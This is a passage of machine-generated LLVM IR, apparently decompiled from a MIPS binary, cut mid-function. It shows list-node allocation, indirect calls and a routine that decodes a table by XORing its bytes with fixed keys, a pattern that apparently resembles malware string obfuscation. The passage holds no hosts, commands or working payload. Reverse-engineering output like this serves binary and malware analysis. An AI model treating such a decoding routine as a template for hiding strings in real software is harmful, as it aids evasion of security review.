  %v2_400810 = sub i32 %.0, %v1_400800
  store i32 %v2_400810, i32* %s1.global-to-local, align 4
  %v3_400820 = load i32, i32* @global_var_4493f0.14, align 4
  store i32 %v3_400820, i32* %t9.global-to-local, align 4
  %v1_400824 = load i32, i32* %s6.global-to-local, align 4
  %v2_400824 = icmp slt i32 %.01, %v1_400824
  %v3_400824 = zext i1 %v2_400824 to i32
  store i32 %v3_400824, i32* %v0.global-to-local, align 4
  store i32 4, i32* %a1.global-to-local, align 4
  %v0_400834 = load i32, i32* %s2.global-to-local, align 4
  %v1_400834 = add i32 %v0_400834, 2
  store i32 %v1_400834, i32* @fp, align 4
  %v1_400838 = icmp eq i1 %v2_400824, false
  %v3_400838 = add i32 %v2_400810, -1
  store i32 %v3_400838, i32* %v1.global-to-local, align 4
  br i1 %v1_400838, label %dec_label_pc_40083c, label %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge

dec_label_pc_4007e4.dec_label_pc_400770_crit_edge: ; preds = %dec_label_pc_4007e4
  %v1_400828 = add i32 %.01, 1
  %v1_400814 = add i32 %v2_400810, -2
  %v2_400770.pre = load i32, i32* %s5.global-to-local, align 4
  br label %dec_label_pc_400770

dec_label_pc_40083c:                              ; preds = %dec_label_pc_4007e4
  store i32 %.1, i32* %v0.global-to-local, align 4
  %v3_400844 = load i32, i32* @global_var_449338.22, align 4
  store i32 %v3_400844, i32* %t9.global-to-local, align 4
  store i32 %.14, i32* %a0.global-to-local, align 4
  %v0_400854 = load i32, i32* @s7, align 4
  store i32 %v0_400854, i32* %a2.global-to-local, align 4
  %v0_400858 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_400858, i32* %a3.global-to-local, align 4
  %v2_40085c = urem i32 %.1, 256
  store i32 %v2_40085c, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400844)
  store i32 %v0_400640, i32* %s6.global-to-local, align 4
  store i32 %v0_400644, i32* %s5.global-to-local, align 4
  store i32 %v0_400648, i32* %s4.global-to-local, align 4
  store i32 %v0_40064c, i32* %s3.global-to-local, align 4
  store i32 %v0_400650, i32* %s2.global-to-local, align 4
  store i32 %v0_400654, i32* %s1.global-to-local, align 4
  store i32 %v0_400658, i32* %s0.global-to-local, align 4
  ret i32 %.1

; uselistorder directives
  uselistorder i32 %v0_400834, { 1, 0 }
  uselistorder i32 %v2_400810, { 2, 0, 3, 1 }
  uselistorder i32 %.0, { 2, 1, 0 }
  uselistorder i32 %v1_400728, { 1, 2, 0 }
  uselistorder i32 %v4_40071c, { 1, 0 }
  uselistorder i32 %v0_4006f0, { 1, 0 }
  uselistorder i32 %.1, { 2, 0, 1 }
  uselistorder i32 %v3_400698, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_400680, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_400670, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_400658, { 1, 2, 0 }
  uselistorder i32 %v0_40063c, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8, 9, 10, 14, 11, 12, 13, 15 }
  uselistorder i32* %t9.global-to-local, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %s6.global-to-local, { 4, 1, 0, 2, 3 }
  uselistorder i32* %s5.global-to-local, { 4, 1, 0, 2, 3 }
  uselistorder i32* %s4.global-to-local, { 5, 3, 0, 1, 2, 4 }
  uselistorder i32* %s3.global-to-local, { 6, 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %s2.global-to-local, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %s1.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %s0.global-to-local, { 9, 1, 0, 2, 4, 5, 3, 6, 7, 8 }
  uselistorder i32* %a3.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %a1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 0 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg2, { 3, 2, 4, 1, 0, 5 }
  uselistorder label %dec_label_pc_4007e4, { 1, 0 }
  uselistorder label %dec_label_pc_4007a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_400740, { 1, 0 }
  uselistorder label %dec_label_pc_4006c0, { 1, 0 }
}

define i32 @function_400898(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_400898:
  %v1.global-to-local = alloca i32, align 4
  %v0_4008ac = load i32, i32* @s1, align 4
  %v0_4008b0 = load i32, i32* @s0, align 4
  %v3_4008b8 = load i32, i32* @global_var_449458.24, align 4
  store i32 %v3_4008b8, i32* @t9, align 4
  %v1_4008bc = urem i32 %arg1, 256
  store i32 %v1_4008bc, i32* @s0, align 4
  store i32 %arg2, i32* @s1, align 4
  %v3_4008c4 = call i32 @function_405c90(i32 12)
  %v0_4008d0 = load i32, i32* @s0, align 4
  %v1_4008d0 = trunc i32 %v0_4008d0 to i8
  %v3_4008d0 = add i32 %v3_4008c4, 4
  %v4_4008d0 = inttoptr i32 %v3_4008d0 to i8*
  store i8 %v1_4008d0, i8* %v4_4008d0, align 1
  %v0_4008d8 = load i32, i32* @s1, align 4
  %v2_4008d8 = inttoptr i32 %v3_4008c4 to i32*
  store i32 %v0_4008d8, i32* %v2_4008d8, align 4
  %v3_4008dc = load i32, i32* @global_var_449504.25, align 4
  store i32 %v3_4008dc, i32* %v1.global-to-local, align 4
  %v1_4008e0 = add i32 %v3_4008c4, 8
  %v2_4008e0 = inttoptr i32 %v1_4008e0 to i32*
  store i32 0, i32* %v2_4008e0, align 4
  %v1_4008e4 = load i32, i32* %v1.global-to-local, align 4
  %v2_4008e4 = add i32 %v1_4008e4, 8
  %v3_4008e4 = inttoptr i32 %v2_4008e4 to i32*
  store i32 %v3_4008c4, i32* %v3_4008e4, align 4
  store i32 %v3_4008c4, i32* @global_var_449504.25, align 4
  store i32 %v0_4008ac, i32* @s1, align 4
  store i32 %v0_4008b0, i32* @s0, align 4
  ret i32 %v3_4008c4
}

define i32 @function_400900() local_unnamed_addr {
dec_label_pc_400900:
  %v3_400918 = load i32, i32* @global_var_449458.24, align 4
  store i32 %v3_400918, i32* @t9, align 4
  %v2_400920 = call i32 @function_405c90(i32 12)
  store i32 %v2_400920, i32* @global_var_449504.25, align 4
  store i32 %v2_400920, i32* @global_var_449500.11, align 4
  %v1_400948 = add i32 %v2_400920, 4
  %v2_400948 = inttoptr i32 %v1_400948 to i8*
  store i8 0, i8* %v2_400948, align 1
  %v1_40094c = add i32 %v2_400920, 8
  %v2_40094c = inttoptr i32 %v1_40094c to i32*
  store i32 0, i32* %v2_40094c, align 4
  ret i32 %v2_400920

; uselistorder directives
  uselistorder i32 %v2_400920, { 0, 1, 3, 2, 4 }
}

define i32 @function_400960() local_unnamed_addr {
dec_label_pc_400960:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %s7.global-to-local = alloca i32, align 4
  %t9.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_400970 = load i32, i32* @ra, align 4
  %v3_400978 = load i32, i32* @global_var_4492a8.26, align 4
  store i32 %v3_400978, i32* @t9, align 4
  %v1_400980 = call i32 @function_400900()
  store i32 %v1_400980, i32* %v0.global-to-local, align 4
  store i32 %v0_400970, i32* @ra, align 4
  %v3_400990 = load i32, i32* @global_var_4493d8.27, align 4
  store i32 %v3_400990, i32* @t9, align 4
  %v3_400994 = load i32, i32* bitcast (i32** @global_var_449354.29 to i32*), align 4
  %v6_40099c = call i32 @function_400898(i32 1, i32 %v3_400994)
  store i32 %v6_40099c, i32* %v0.global-to-local, align 4
  %v1_4009ac = load i32, i32* @t9, align 4
  %v0_4009d0 = load i32, i32* @s2, align 4
  store i32 %v0_4009d0, i32* %stack_var_-32, align 4
  %v0_4009d4 = load i32, i32* @s1, align 4
  %v1_4009e0 = add i32 %v1_4009ac, 297548
  %v2_4009e0 = inttoptr i32 %v1_4009e0 to i32*
  %v3_4009e0 = load i32, i32* %v2_4009e0, align 4
  store i32 %v3_4009e0, i32* %t9.global-to-local, align 4
  store i32 1, i32* %s5.global-to-local, align 4
  store i32 %v3_400994, i32* %s6.global-to-local, align 4
  %v0_4009f4 = load i32, i32* @a3, align 4
  store i32 %v0_4009f4, i32* %s1.global-to-local, align 4
  %v1_4009f8 = load i32, i32* @a2, align 4
  %v2_4009f8 = urem i32 %v1_4009f8, 256
  store i32 %v2_4009f8, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4009e0)
  %v3_400a08 = load i32, i32* @global_var_4492e4, align 4
  store i32 %v3_400a08, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400a08)
  %v3_400a20 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  store i32 %v3_400a20, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400a20)
  %v3_400a40 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  store i32 %v3_400a40, i32* %t9.global-to-local, align 4
  %v2_400a50 = urem i32 %v6_40099c, 65536
  store i32 %v2_400a50, i32* %s7.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400a40)
  %v3_400a60 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  store i32 %v3_400a60, i32* %t9.global-to-local, align 4
  store i32 %v2_400a50, i32* %s4.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400a60)
  %v3_400a80 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  store i32 %v3_400a80, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400a80)
  %v1_400a98 = mul i32 %v6_40099c, 16777216
  %v1_400a9c = sdiv i32 %v1_400a98, 16777216
  store i32 65535, i32* %v0.global-to-local, align 4
  store i32 %v6_40099c, i32* %s3.global-to-local, align 4
  store i32 %v6_40099c, i32* %s2.global-to-local, align 4
  %v0_400ab4 = load i32, i32* %s4.global-to-local, align 4
  %v2_400ab4 = icmp eq i32 %v0_400ab4, 65535
  br i1 %v2_400ab4, label %dec_label_pc_400ab8, label %dec_label_pc_400ad4

dec_label_pc_400ab8:                              ; preds = %dec_label_pc_400960
  %v1_400abc = add i32 %v1_4009ac, 297584
  %v2_400abc = inttoptr i32 %v1_400abc to i32*
  %v3_400abc = load i32, i32* %v2_400abc, align 4
  store i32 %v3_400abc, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400abc)
  %v0_400ad0 = load i32, i32* %v0.global-to-local, align 4
  %v1_400ad0 = urem i32 %v0_400ad0, 65536
  store i32 %v1_400ad0, i32* %s4.global-to-local, align 4
  br label %dec_label_pc_400ad4

dec_label_pc_400ad4:                              ; preds = %dec_label_pc_400960, %dec_label_pc_400ab8
  %v0_400ad4 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v0_400ad4, i32* %s1.global-to-local, align 4
  store i32 0, i32* %s6.global-to-local, align 4
  %v0_400ae0.pre = load i32, i32* %t9.global-to-local, align 4
  br label %dec_label_pc_400ae0

dec_label_pc_400ae0:                              ; preds = %dec_label_pc_400ba0, %dec_label_pc_400ad4
  %v0_400ae0 = phi i32 [ %v3_400bc4, %dec_label_pc_400ba0 ], [ %v0_400ae0.pre, %dec_label_pc_400ad4 ]
  call void @__pseudo_call(i32 %v0_400ae0)
  %v0_400aec = load i32, i32* %v0.global-to-local, align 4
  %v1_400aec = load i32, i32* %s3.global-to-local, align 4
  %v2_400aec = inttoptr i32 %v1_400aec to i32*
  store i32 %v0_400aec, i32* %v2_400aec, align 4
  store i32 65535, i32* %v0.global-to-local, align 4
  %v3_400af4 = load i32, i32* @global_var_449308, align 4
  store i32 %v3_400af4, i32* %t9.global-to-local, align 4
  %v0_400af8 = load i32, i32* %s7.global-to-local, align 4
  %v2_400af8 = icmp eq i32 %v0_400af8, 65535
  %extract.t = trunc i32 %v0_400af8 to i16
  br i1 %v2_400af8, label %dec_label_pc_400afc, label %dec_label_pc_400b14

dec_label_pc_400afc:                              ; preds = %dec_label_pc_400ae0
  call void @__pseudo_call(i32 %v3_400af4)
  %v0_400b10 = load i32, i32* %v0.global-to-local, align 4
  %v1_400b10 = trunc i32 %v0_400b10 to i16
  %v2_400b10 = load i32, i32* %s1.global-to-local, align 4
  %v3_400b10 = add i32 %v2_400b10, 2
  %v4_400b10 = inttoptr i32 %v3_400b10 to i16*
  store i16 %v1_400b10, i16* %v4_400b10, align 2
  %v0_400b14.pre = load i32, i32* %s7.global-to-local, align 4
  %extract.t12 = trunc i32 %v0_400b14.pre to i16
  br label %dec_label_pc_400b14

dec_label_pc_400b14:                              ; preds = %dec_label_pc_400ae0, %dec_label_pc_400afc
  %v0_400b14.off0 = phi i16 [ %extract.t, %dec_label_pc_400ae0 ], [ %extract.t12, %dec_label_pc_400afc ]
  %v2_400b14 = load i32, i32* %s1.global-to-local, align 4
  %v3_400b14 = add i32 %v2_400b14, 2
  %v4_400b14 = inttoptr i32 %v3_400b14 to i16*
  store i16 %v0_400b14.off0, i16* %v4_400b14, align 2
  %v3_400b18 = load i32, i32* @global_var_449338.22, align 4
  store i32 %v3_400b18, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b18)
  %v3_400b34 = load i32, i32* @global_var_4492d0.45, align 4
  store i32 %v3_400b34, i32* %t9.global-to-local, align 4
  %v0_400b38 = load i32, i32* %v0.global-to-local, align 4
  %v0_400b44 = load i32, i32* %s6.global-to-local, align 4
  %v1_400b44 = add i32 %v0_400b44, 1
  store i32 %v1_400b44, i32* %s6.global-to-local, align 4
  %v0_400b48 = load i32, i32* %s3.global-to-local, align 4
  %v1_400b48 = add i32 %v0_400b48, 4
  store i32 %v1_400b48, i32* %s3.global-to-local, align 4
  %v2_400b4c = icmp eq i32 %v0_400b38, -1
  %v4_400b4c = load i32, i32* %s2.global-to-local, align 4
  %v5_400b4c = inttoptr i32 %v4_400b4c to i32*
  store i32 %v0_400b38, i32* %v5_400b4c, align 4
  br i1 %v2_400b4c, label %dec_label_pc_400c48.loopexit, label %dec_label_pc_400b50

dec_label_pc_400b50:                              ; preds = %dec_label_pc_400b14
  store i32 2, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b34)
  %v0_400b68 = load i32, i32* %s1.global-to-local, align 4
  %v1_400b68 = add i32 %v0_400b68, 20
  %v2_400b68 = inttoptr i32 %v1_400b68 to i8*
  %v3_400b68 = load i8, i8* %v2_400b68, align 1
  %v1_400b70 = icmp ult i8 %v3_400b68, 32
  %v2_400b70 = zext i1 %v1_400b70 to i32
  store i32 %v2_400b70, i32* %v0.global-to-local, align 4
  %v3_400b74 = load i32, i32* @global_var_449308, align 4
  store i32 %v3_400b74, i32* %t9.global-to-local, align 4
  %v1_400b78 = icmp eq i1 %v1_400b70, false
  br i1 %v1_400b78, label %dec_label_pc_400ba0, label %dec_label_pc_400b7c

dec_label_pc_400b7c:                              ; preds = %dec_label_pc_400b50
  %v1_400b80 = add i32 %v0_400b68, 16
  %v2_400b80 = inttoptr i32 %v1_400b80 to i32*
  %v3_400b80 = load i32, i32* %v2_400b80, align 4
  store i32 %v3_400b80, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b74)
  %v0_400b8c = load i32, i32* %s1.global-to-local, align 4
  %v1_400b8c = add i32 %v0_400b8c, 20
  %v2_400b8c = inttoptr i32 %v1_400b8c to i8*
  %v3_400b8c = load i8, i8* %v2_400b8c, align 1
  %v4_400b8c = zext i8 %v3_400b8c to i32
  %v0_400b94 = load i32, i32* %v0.global-to-local, align 4
  %v2_400b94 = lshr i32 %v0_400b94, %v4_400b8c
  store i32 %v2_400b94, i32* %v0.global-to-local, align 4
  %v0_400b98 = load i32, i32* %s0.global-to-local, align 4
  %v2_400b98 = add i32 %v0_400b98, %v2_400b94
  store i32 %v2_400b98, i32* %s0.global-to-local, align 4
  %v2_400b9c = add i32 %v0_400b8c, 4
  %v3_400b9c = inttoptr i32 %v2_400b9c to i32*
  store i32 %v2_400b98, i32* %v3_400b9c, align 4
  br label %dec_label_pc_400ba0

dec_label_pc_400ba0:                              ; preds = %dec_label_pc_400b50, %dec_label_pc_400b7c
  %v3_400ba0 = load i32, i32* @global_var_44939c.48, align 4
  store i32 %v3_400ba0, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400ba0)
  %v0_400bb8 = load i32, i32* %s2.global-to-local, align 4
  %v1_400bb8 = add i32 %v0_400bb8, 4
  store i32 %v1_400bb8, i32* %s2.global-to-local, align 4
  %v0_400bbc = load i32, i32* %s1.global-to-local, align 4
  %v1_400bbc = add i32 %v0_400bbc, 24
  store i32 %v1_400bbc, i32* %s1.global-to-local, align 4
  %v0_400bc0 = load i32, i32* %s6.global-to-local, align 4
  %v1_400bc0 = load i32, i32* %s5.global-to-local, align 4
  %v2_400bc0 = icmp slt i32 %v0_400bc0, %v1_400bc0
  %v3_400bc0 = zext i1 %v2_400bc0 to i32
  store i32 %v3_400bc0, i32* %v0.global-to-local, align 4
  %v3_400bc4 = load i32, i32* @global_var_4492e4, align 4
  store i32 %v3_400bc4, i32* %t9.global-to-local, align 4
  br i1 %v2_400bc0, label %dec_label_pc_400ae0, label %dec_label_pc_400bd0

dec_label_pc_400bd0:                              ; preds = %dec_label_pc_400ba0
  store i32 0, i32* %s2.global-to-local, align 4
  store i32 0, i32* %s1.global-to-local, align 4
  %v1_400a98.off = or i32 %v1_400a98, 16777215
  %tmp = icmp ult i32 %v1_400a98.off, 33554431
  %v1_400c00 = add i32 %v1_4009ac, 297596
  %v2_400c00 = inttoptr i32 %v1_400c00 to i32*
  br label %dec_label_pc_400be0

dec_label_pc_400be0:                              ; preds = %dec_label_pc_400bfc, %dec_label_pc_400bd0
  %v1_400c048 = phi i32 [ %v1_400c20, %dec_label_pc_400bfc ], [ 0, %dec_label_pc_400bd0 ]
  %v0_400bf0 = phi i32 [ %v3_400c2c, %dec_label_pc_400bfc ], [ %v3_400bc4, %dec_label_pc_400bd0 ]
  %v0_400be4 = phi i32 [ %v2_400c34, %dec_label_pc_400bfc ], [ 65535, %dec_label_pc_400bd0 ]
  store i32 %v1_400a9c, i32* %v0.global-to-local, align 4
  %v1_400be4 = inttoptr i32 %v0_400be4 to i32*
  %v2_400be4 = load i32, i32* %v1_400be4, align 4
  store i32 %v2_400be4, i32* %s0.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_400bfc, label %dec_label_pc_400bec

dec_label_pc_400bec:                              ; preds = %dec_label_pc_400be0
  call void @__pseudo_call(i32 %v0_400bf0)
  %v1_400c04.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_400bfc

dec_label_pc_400bfc:                              ; preds = %dec_label_pc_400be0, %dec_label_pc_400bec
  %v1_400c04 = phi i32 [ %v1_400c048, %dec_label_pc_400be0 ], [ %v1_400c04.pre, %dec_label_pc_400bec ]
  %v3_400c00 = load i32, i32* %v2_400c00, align 4
  store i32 %v3_400c00, i32* %t9.global-to-local, align 4
  %v2_400c04 = add i32 %v1_400c04, %v6_40099c
  store i32 %v2_400c04, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400c00)
  %v0_400c20 = load i32, i32* %s1.global-to-local, align 4
  %v1_400c20 = add i32 %v0_400c20, 4
  store i32 %v1_400c20, i32* %s1.global-to-local, align 4
  %v0_400c28 = load i32, i32* %s2.global-to-local, align 4
  %v1_400c28 = load i32, i32* %s5.global-to-local, align 4
  %v2_400c28 = icmp slt i32 %v0_400c28, %v1_400c28
  %v3_400c28 = zext i1 %v2_400c28 to i32
  store i32 %v3_400c28, i32* %v0.global-to-local, align 4
  %v3_400c2c = load i32, i32* @global_var_449300.51, align 4
  store i32 %v3_400c2c, i32* %t9.global-to-local, align 4
  %v1_400c30 = add i32 %v0_400c28, 1
  store i32 %v1_400c30, i32* %s2.global-to-local, align 4
  %v2_400c34 = add i32 %v1_400c20, %v6_40099c
  %v1_400c38 = icmp eq i1 %v2_400c28, false
  br i1 %v1_400c38, label %dec_label_pc_400c3c, label %dec_label_pc_400be0

dec_label_pc_400c3c:                              ; preds = %dec_label_pc_400bfc
  store i32 0, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_400c48

dec_label_pc_400c48.loopexit:                     ; preds = %dec_label_pc_400b14
  %v4_400c70.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_400c48

dec_label_pc_400c48:                              ; preds = %dec_label_pc_400c48.loopexit, %dec_label_pc_400c3c
  %v4_400c70 = phi i32 [ %v4_400c70.pre, %dec_label_pc_400c48.loopexit ], [ 0, %dec_label_pc_400c3c ]
  %v3_400c64 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_400c64, i32* %s2.global-to-local, align 4
  store i32 %v0_4009d4, i32* %s1.global-to-local, align 4
  ret i32 %v4_400c70

; uselistorder directives
  uselistorder i32 %v3_400c2c, { 1, 0 }
  uselistorder i32 %v1_400c20, { 0, 2, 1 }
  uselistorder i32 %v3_400bc4, { 0, 2, 1 }
  uselistorder i32 %v0_400b38, { 1, 0 }
  uselistorder i32 %v2_400a50, { 1, 0 }
  uselistorder i32 %v1_4009ac, { 1, 0, 2 }
  uselistorder i32 %v6_40099c, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32* %v0.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %t9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %s7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_400bfc, { 1, 0 }
  uselistorder label %dec_label_pc_400ba0, { 1, 0 }
  uselistorder label %dec_label_pc_400b14, { 1, 0 }
  uselistorder label %dec_label_pc_400ad4, { 1, 0 }
}

define i32 @function_400c78(i32 %arg1) local_unnamed_addr {
dec_label_pc_400c78:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v3_400c84 = load i32, i32* bitcast (i32** @global_var_4492cc.54 to i32*), align 4
  store i32 %v3_400c84, i32* %v0.global-to-local, align 4
  store i32 %v3_400c84, i32* %a1.global-to-local, align 4
  %v1_400c94 = urem i32 %arg1, 256
  store i32 %v1_400c94, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_400c98

dec_label_pc_400c98:                              ; preds = %dec_label_pc_400da4, %dec_label_pc_400c78
  %v0_400cb0 = phi i32 [ %v3_400da4, %dec_label_pc_400da4 ], [ %v3_400c84, %dec_label_pc_400c78 ]
  %v1_400c98 = inttoptr i32 %v0_400cb0 to i32*
  %v2_400c98 = load i32, i32* %v1_400c98, align 4
  store i32 %v2_400c98, i32* %v0.global-to-local, align 4
  %v1_400ca0 = icmp sgt i32 %v2_400c98, 0
  %v2_400ca8 = icmp eq i32 %v1_400c94, %v2_400c98
  %or.cond = and i1 %v1_400ca0, %v2_400ca8
  br i1 %or.cond, label %dec_label_pc_400cac, label %dec_label_pc_400da4

dec_label_pc_400cac:                              ; preds = %dec_label_pc_400c98
  %v1_400cb0 = add i32 %v0_400cb0, 10
  %v2_400cb0 = inttoptr i32 %v1_400cb0 to i8*
  %v3_400cb0 = load i8, i8* %v2_400cb0, align 1
  %v4_400cb0 = sext i8 %v3_400cb0 to i32
  store i32 %v4_400cb0, i32* %v0.global-to-local, align 4
  %v1_400cb8 = icmp eq i8 %v3_400cb0, 0
  store i32 0, i32* %a0.global-to-local, align 4
  br i1 %v1_400cb8, label %dec_label_pc_400db8, label %dec_label_pc_400cbc

dec_label_pc_400cbc:                              ; preds = %dec_label_pc_400cac
  store i32 -19, i32* %t0.global-to-local, align 4
  store i32 -22, i32* @a3, align 4
  store i32 -34, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400cd0

dec_label_pc_400cd0:                              ; preds = %dec_label_pc_400cd0.dec_label_pc_400cd0_crit_edge, %dec_label_pc_400cbc
  %v1_400ce4 = phi i32 [ %v1_400ce4.pre, %dec_label_pc_400cd0.dec_label_pc_400cd0_crit_edge ], [ -19, %dec_label_pc_400cbc ]
  %v0_400cd8 = phi i32 [ %v0_400d48, %dec_label_pc_400cd0.dec_label_pc_400cd0_crit_edge ], [ 0, %dec_label_pc_400cbc ]
  %v0_400cd0 = phi i32 [ %v0_400d40, %dec_label_pc_400cd0.dec_label_pc_400cd0_crit_edge ], [ %v0_400cb0, %dec_label_pc_400cbc ]
  %v1_400cd0 = add i32 %v0_400cd0, 4
  %v2_400cd0 = inttoptr i32 %v1_400cd0 to i32*
  %v3_400cd0 = load i32, i32* %v2_400cd0, align 4
  %v2_400cd8 = add i32 %v3_400cd0, %v0_400cd8
  %v1_400cdc = inttoptr i32 %v2_400cd8 to i8*
  %v2_400cdc = load i8, i8* %v1_400cdc, align 1
  %v3_400cdc = zext i8 %v2_400cdc to i32
  %v2_400ce4 = xor i32 %v3_400cdc, %v1_400ce4
  store i32 %v2_400ce4, i32* %v0.global-to-local, align 4
  %v1_400ce8 = trunc i32 %v2_400ce4 to i8
  store i8 %v1_400ce8, i8* %v1_400cdc, align 1
  %v0_400cec = load i32, i32* %a1.global-to-local, align 4
  %v1_400cec = add i32 %v0_400cec, 4
  %v2_400cec = inttoptr i32 %v1_400cec to i32*
  %v3_400cec = load i32, i32* %v2_400cec, align 4
  %v0_400cf4 = load i32, i32* %a0.global-to-local, align 4
  %v2_400cf4 = add i32 %v0_400cf4, %v3_400cec
  %v1_400cf8 = inttoptr i32 %v2_400cf4 to i8*
  %v2_400cf8 = load i8, i8* %v1_400cf8, align 1
  %v3_400cf8 = zext i8 %v2_400cf8 to i32
  %v1_400d00 = load i32, i32* @a3, align 4
  %v2_400d00 = xor i32 %v1_400d00, %v3_400cf8
  store i32 %v2_400d00, i32* %v0.global-to-local, align 4
  %v1_400d04 = trunc i32 %v2_400d00 to i8
  store i8 %v1_400d04, i8* %v1_400cf8, align 1
  %v0_400d08 = load i32, i32* %a1.global-to-local, align 4
  %v1_400d08 = add i32 %v0_400d08, 4
  %v2_400d08 = inttoptr i32 %v1_400d08 to i32*
  %v3_400d08 = load i32, i32* %v2_400d08, align 4
  %v0_400d10 = load i32, i32* %a0.global-to-local, align 4
  %v2_400d10 = add i32 %v0_400d10, %v3_400d08
  %v1_400d14 = inttoptr i32 %v2_400d10 to i8*
  %v2_400d14 = load i8, i8* %v1_400d14, align 1
  %v3_400d14 = zext i8 %v2_400d14 to i32
  %v1_400d1c = load i32, i32* %a2.global-to-local, align 4
  %v2_400d1c = xor i32 %v1_400d1c, %v3_400d14
  store i32 %v2_400d1c, i32* %v0.global-to-local, align 4
  %v1_400d20 = trunc i32 %v2_400d1c to i8
  store i8 %v1_400d20, i8* %v1_400d14, align 1
  %v0_400d24 = load i32, i32* %a1.global-to-local, align 4
  %v1_400d24 = add i32 %v0_400d24, 4
  %v2_400d24 = inttoptr i32 %v1_400d24 to i32*
  %v3_400d24 = load i32, i32* %v2_400d24, align 4
  %v0_400d2c = load i32, i32* %a0.global-to-local, align 4
  %v2_400d2c = add i32 %v0_400d2c, %v3_400d24
  %v1_400d30 = inttoptr i32 %v2_400d2c to i8*
  %v2_400d30 = load i8, i8* %v1_400d30, align 1
  %v3_400d30 = zext i8 %v2_400d30 to i32
  %v1_400d34 = add i32 %v0_400d2c, 1
  store i32 %v1_400d34, i32* %a0.global-to-local, align 4
  %v1_400d38 = load i32, i32* %a2.global-to-local, align 4
  %v2_400d38 = xor i32 %v1_400d38, %v3_400d30
  store i32 %v2_400d38, i32* %v0.global-to-local, align 4
  %v1_400d3c = trunc i32 %v2_400d38 to i8
  store i8 %v1_400d3c, i8* %v1_400d30, align 1
  %v0_400d40 = load i32, i32* %a1.global-to-local, align 4
  %v1_400d40 = add i32 %v0_400d40, 8
  %v2_400d40 = inttoptr i32 %v1_400d40 to i16*
  %v3_400d40 = load i16, i16* %v2_400d40, align 2
  %v4_400d40 = zext i16 %v3_400d40 to i32
  %v0_400d48 = load i32, i32* %a0.global-to-local, align 4
  %v2_400d48 = icmp slt i32 %v0_400d48, %v4_400d40
  %v3_400d48 = zext i1 %v2_400d48 to i32
  store i32 %v3_400d48, i32* %v0.global-to-local, align 4
  br i1 %v2_400d48, label %dec_label_pc_400cd0.dec_label_pc_400cd0_crit_edge, label %dec_label_pc_400d50

dec_label_pc_400cd0.dec_label_pc_400cd0_crit_edge: ; preds = %dec_label_pc_400cd0
  %v1_400ce4.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_400cd0

dec_label_pc_400d50:                              ; preds = %dec_label_pc_400cd0
  store i32 0, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400d5c

dec_label_pc_400d5c:                              ; preds = %dec_label_pc_400d5c, %dec_label_pc_400d50
  %v0_400d64 = phi i32 [ %v1_400d84, %dec_label_pc_400d5c ], [ 0, %dec_label_pc_400d50 ]
